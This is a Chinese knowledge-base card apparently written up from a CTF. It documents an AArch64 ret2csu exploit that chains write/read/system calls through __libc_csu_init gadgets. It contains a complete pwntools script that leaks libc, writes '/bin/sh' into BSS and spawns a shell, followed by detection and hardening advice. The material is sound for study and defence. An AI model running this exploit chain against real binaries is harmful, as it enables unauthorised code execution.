---
id: binary-pwn-rop-aarch64-ret2csu-register-mapping-ret2libc
title: AArch64 ret2csu（x22→x0 参数映射变体）：main 结尾弹栈落到 csu，三段调用 write 泄 libc → read 写 BSS → system
type: scenario
domain: binary
path: binary/pwn/rop
technique: aarch64-ret2csu-register-mapping-ret2libc
tags:
- pwn
- aarch64
- arm64
- ret2csu
- rop
- ret2libc
- qemu
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V650
  verified_at: '2026-11-13T05:05:06+08:00'
  notes: 已对照原文与全部26图核对：checksec aarch64-64-little/Partial RELRO/No canary/NX/No PIE（图7）；g2=0x4007F0(__libc_csu_init+72) 的 LDR X3,[X21,X19,LSL#3];MOV X2,X24;ADD X19,#1;MOV X1,X23;MOV W0,W22;BLR X3;CMP X20,X19;B.NE 与 g1=0x400810(+104) 的 LDP X19..X24;LDP X29,X30,[SP],#0x40;RET（图2/4/5、图12-15 gdb 符号确认）；vul 帧 STP X29,X30,[SP,#-0x90]!、buf=SP+0x10、read 0x200（图10）、main 收尾 LDP ...,#0x20（图11）、溢出 'a'*0x88 覆盖 main 保存 x29/x30 的布局与图13/18 栈内容一致；三段链 write(1,write@got,8)→read(0,bss1,0x20)→system(bss1+8) 的寄存器现场（图16/20/24/25）、泄露值 write=0x4000915c10/libcbase=0x4000852000/system=0x4000892578（图17）、BSS 写入 system+/bin/sh（图21）、cat flag（图26）均对上。修正：原文运行结果处『七字节泄露』改为实际输出8字节/读回6字节。dedup：与 binary-pwn-rop-aarch64-ret2csu-mprotect-shellcode 为不同二进制与产物（对方 x24→x0、0x4008AC/0x4008CC、mprotect+shellcode 尾链），寄存器映射相反、尾链不同，非同一利用链保留。未设 affected_versions（原文未标注 glibc/版本）；frontmatter 无 sources/source_url；g1/g2 的 +104/+72 已由 gdb 符号核实。
url: /docs/binary/pwn/rop/binary-pwn-rop-aarch64-ret2csu-register-mapping-ret2libc/
draft: false
kb_aliases:
- aarch64 ret2csu
- ARM64 ret2csu
- csu gadget 参数映射
- x22 x23 x24 gadget
- aarch64 ret2libc
- bpc_csu
---

## 一句话结论

AArch64 二进制里 `__libc_csu_init` 的 LDP 装载段 + `LDR X3,[X21,X19,LSL#3]; BLR X3` 循环段可拼出 ret2csu；但**寄存器到函数参数的映射随编译结果变化**——本例循环段是 `MOV X2,X24; MOV X1,X23; MOV W0,W22`（x22→x0、x23→x1、x24→x2），与常见 GCC 版本的 x24→x0 恰好相反。利用它做三段 csu 调用：`write(1, write@got, 8)` 泄 libc → `read(0, bss+0x100, 0x20)` 把 `system` 指针与 `"/bin/sh"` 写进 BSS → `system("/bin/sh")` getshell。

## 原理

- **AArch64 调用约定与返回**：前 4 个参数在 `x0–x3`，返回地址在 `x30`（LR），`RET` 直接跳 `x30`；栈溢出覆盖保存的 `x29/x30` 即可控制返回目标。没有 x86 式 `pop rdi/rsi/rdx`，因此需要 csu 型通用 gadget 设参。
- **装载段 g1（`__libc_csu_init+104`，本例 0x400810）**：
  ```asm
  LDP X19, X20, [SP, #0x10]
  LDP X21, X22, [SP, #0x20]
  LDP X23, X24, [SP, #0x30]
  LDP X29, X30, [SP], #0x40
  RET
  ```
  从栈上连续 qword 装载 x19–x24，同时把 `[SP]`/`[SP+8]` 装进 `x29/x30`，`SP += 0x40` 后跳到 `x30`。
- **调用段 g2（`__libc_csu_init+72`，本例 0x4007F0）**：
  ```asm
  LDR X3, [X21, X19, LSL#3]   ; x3 = *(x21 + x19*8)，即函数指针
  MOV X2, X24                 ; x2 = x24
  ADD X19, X19, #1
  MOV X1, X23                 ; x1 = x23
  MOV W0, W22                 ; x0 = x22 的低 32 位
  BLR X3                      ; 调用
  CMP X20, X19
  B.NE loc_4007F0             ; x19 != x20 时循环
  ```
  取 `x19=0、x20=1` 时循环体只执行一次；随后顺序落入 0x400810 的 g1 代码，再次用 `[SP]`/`[SP+8]` 装载 `x29/x30` 并 `SP += 0x40` 后 `RET`，实现“调用一次再返回指定地址”。
- **为何能设参**：`x21` 是函数指针数组基址、`x19*8` 是索引，`BLR X3` 前用 `x22/x23/x24` 覆盖 `x0/x1/x2`。只要目标函数参数不超过 3 个，就能完整调用 PLT 或 GOT 中的函数（`ldr` 直接读 GOT 得到 libc 地址）。
- **寄存器映射是关键陷阱**：不同 GCC/编译选项生成的 `__libc_csu_init` 中 `MOV` 顺序可能不同（本库已有卡为 `MOV X2,X22; MOV X1,X23; MOV W0,X24`，即 x24→x0）。利用前必须按目标二进制反汇编确认“哪个 x2x 寄存器对应 x0/x1/x2”，不能照抄 payload 模板。
- **栈布局细节**：本例溢出发生在被调函数 `vul` 的 0x80 缓冲区，buf 位于 `SP+0x10`，`vul` 自己的保存 `x29/x30` 在 buf 之下不会被覆盖；`vul` 正常返回 main 后，main 的收尾 `LDP X29, X30, [SP], #0x20; RET` 会从 buf+0x80 处弹出被覆盖的 `x29/x30`，才跳到 g1。`LDP ...,#0x20` 一次抬栈 0x20 但只装载 0x10，故 g1 前需要两个填充 qword 对齐（本例填 `main` 与任意值），g1 入口 `SP` 正好落在后续的 `x29/x30` 对上。
- **为什么完整**：三段调用分别完成泄露（write GOT）、写内存（read 到 BSS）、执行（system），不依赖任何现成 `pop x0` gadget，也不需要 mprotect+shellcode；No PIE 下所有地址固定，BSS 可写。

## 触发条件

- AArch64（`aarch64-64-little`）ELF，存在栈溢出（本例 `read(0, buf, 0x200)` 写入 0x80 缓冲区），且能覆盖到调用链上保存的 `x29/x30`。
- 二进制含 `__libc_csu_init` 的 LDP 装载段与 `LDR/BLR` 循环段；**需反汇编确认寄存器映射**（本例 x22→x0、x23→x1、x24→x2）。
- 无 PIE（或已泄露基址）、Partial RELRO 可读 GOT；有可写 BSS 用于第二阶段写 `system` 指针与 `"/bin/sh"`。
- 已知目标 libc（已知 write 偏移），或可用其他泄露手段。
- 本地可用 `qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./pwn` 运行、`gdb-multiarch` + `target remote` 调试（`-g` 指定端口）。

## 利用步骤

1. `checksec` 确认 aarch64、No PIE、NX、无 canary；反汇编 `__libc_csu_init`，记录装载段 g1、循环段 g2 地址与 `MOV W0,W22 / MOV X1,X23 / MOV X2,X24` 的参数映射。
2. 确认溢出点与到 main 保存 `x30` 的偏移（本例 `'a'*0x88`），并在 g1 前留两个填充 qword 抵消 main 收尾 `LDP ...,#0x20` 的抬栈。
3. 第一段 payload：`'a'*0x88 + g1 + 填充(main, 任意) + (0, g2) + (x19=0, x20=1) + (x21=write@got, x22=1) + (x23=write@got, x24=8) + (0, main)`。触发后调用 `write(1, write@got, 8)`，读回 6 字节算 libc 基址。
4. 第二段 payload 同构，改为 `x21=read@got, x22=0, x23=bss+0x100, x24=0x20`，返回 main；随后向程序发送 `p64(system) + b"/bin/sh\x00"`，由 `read(0, bss+0x100, 0x20)` 写入 BSS。
5. 第三段 payload：`x19=0, x20=1, x21=bss+0x100, x22=bss+0x108, x23=0, x24=0`，即 `*(bss+0x100)=system` 为函数指针，`x0=bss+0x108` 指向 `"/bin/sh"`；执行 `system("/bin/sh")`。
6. 交互执行 `cat flag` 验证。

## PoC

以下为按原文 exp 精简的核心片段（地址为该题固定值，换题需重新定位；`bss1 = 0x411140`）：

```python
from pwn import *
context(os='linux', arch='aarch64', log_level='debug')

p = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', './pwn'])
# 调试：qemu-aarch64 -g 7010 ... + gdb-multiarch -ex 'target remote 127.0.0.1:7010'
elf  = ELF('./pwn')
libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')

g1   = 0x400810   # LDP X19..X24; LDP X29,X30,[SP],#0x40; RET
g2   = 0x4007F0   # LDR X3,[X21,X19,LSL#3]; ...; BLR X3
main = 0x40076c
bss1 = 0x411140   # bss+0x100

def csu(x21, x22, x23, x24, ret):
    pl  = b'a' * 0x88 + p64(g1)
    pl += p64(main) + p64(0x100000000)   # 抵消 main 收尾 LDP ...,#0x20 的填充
    pl += p64(0) + p64(g2)               # g1: x29, x30
    pl += p64(0) + p64(1)                # x19=0, x20=1（循环一次）
    pl += p64(x21) + p64(x22)            # x21=函数指针数组, x22 -> x0
    pl += p64(x23) + p64(x24)            # x23 -> x1, x24 -> x2
    pl += p64(0) + p64(ret)              # 调用后落回 g1 尾部 LDP 的 x29/x30
    return pl

# 1) write(1, write@got, 8) 泄 libc
p.sendlineafter('Hello, World\n', csu(elf.got['write'], 1, elf.got['write'], 8, main))
write_addr = u64(p.recv(6).ljust(8, b'\x00'))
libcbase = write_addr - libc.sym['write']
system = libcbase + libc.sym['system']

# 2) read(0, bss1, 0x20)，再送 system 指针 + "/bin/sh"
p.sendlineafter('Hello, World\n', csu(elf.got['read'], 0, bss1, 0x20, main))
p.sendline(p64(system) + b'/bin/sh\x00')

# 3) system(bss1+8)
p.sendlineafter('Hello, World\n', csu(bss1, bss1 + 8, 0, 0, main))
p.interactive()
```

原文运行结果：write 实际输出 8 字节、exp 读回 6 字节，得到 `write=0x4000915c10`、`libcbase=0x4000852000`、`system=0x4000892578`，最终执行 `cat flag` 得到 `flag{n0_pw0er_cAt}`。

## 变体与关联

- 同族不同实例：`binary-pwn-rop-aarch64-ret2csu-mprotect-shellcode` 使用同一类 LDP/BLR gadget，但其 g2 为 `MOV X2,X22; MOV X1,X23; MOV W0,X24`（x24→x0），尾链是 `mprotect(bss,0x1000,7)` 后跳 shellcode；与本卡对照可确认“参数映射随编译变化”这一易错点。
- 同技法跨架构：x86-64 的 `binary-pwn-rop-ret2csu-write-got-leak-ret2libc`、MIPS 的 `binary-pwn-rop-mips-ret2csu-libc-csu-init`、以及 PIE 下借 csu 返回地址泄露基址的 `binary-pwn-stack-pie-base-leak-csu-init-return-address`。
- 变体：无 `mprotect` 时可用本卡的 write/read/system 三段式；静态链接时可找 `svc` 系统调用 gadget 自建 execve；有 PIE 时先泄基址再算 gadget/GOT；ARMv8.5+ 的 BTI/PAC 会提高间接调用门槛。
- 关联原理：`__libc_csu_init` 为调用构造函数数组保留了“装载 + 间接调用”序列，任何 AArch64 glibc 程序都可能残留；`LDR X3,[X21,X19,LSL#3]` 天然支持数组式多函数调用。

## 检测与防御

- 代码层：所有栈写入按实际缓冲区大小校验（本例 read 长度 0x200 远超 0x80）；开启 canary。
- 编译/运行层：PIE + Full RELRO + canary 组合可显著提高门槛；ARMv8.5+ 启用 BTI/PAC 限制 `BLR` 到任意寄存器；BSS 保持 NX，避免二次写入可执行内容（本链虽不执行 shellcode，但会写函数指针）。
- 检测信号：崩溃/调用现场 `pc` 落在 `__libc_csu_init` gadget、`x19–x24` 呈攻击者可控栈值；对 GOT 的 `LDR` 后紧接 `BLR X3` 的调用序列；进程异常读取自身 GOT 并从 BSS 执行函数指针。
- 防御边界：No PIE 是地址固定前提；若开启 PIE，需要先泄露基址，链仍成立，因此不能只依赖 PIE。
